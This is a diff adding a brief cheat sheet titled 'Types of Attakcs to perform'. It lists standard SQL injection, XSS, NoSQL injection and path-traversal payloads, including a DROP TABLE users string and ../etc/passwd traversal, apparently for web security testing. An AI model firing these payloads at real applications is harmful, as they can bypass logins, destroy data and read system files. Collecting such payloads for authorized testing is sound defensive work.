@@ -1,0 +1,49 @@
+Types of Attakcs to perform
+
+1.SQL INJECTION
+
+a. ' OR 1=1 --
+
+b. admin'--
+
+c. "; DROP TABLE users; --
+
+d. UNION SELECT
+
+e. UPDATE … SET
+
+f. INSERT INTO
+
+g. SELECT … FROM
+
+
+2.XSS Attakcs
+
+a "/><script>alert(1)</script>
+
+b.<img src=x onerror=alert(1)>
+
+c.javascript:
+
+d.<iframe>
+
+e."</svg onload=alert(1)>
+
+3.NO-SQL Attakcs
+
+a.{"$ne": ""}
+
+b.{"$gt": ""}
+
+c.{"$regex": ".*"}
+
+4.Path Traversal
+
+a.  ../../../../etc/passwd
+
+b.  ..%2F..%2F..%2Fetc%2Fpasswd
+
+
+"/><script>alert('hello')</script>
+
+
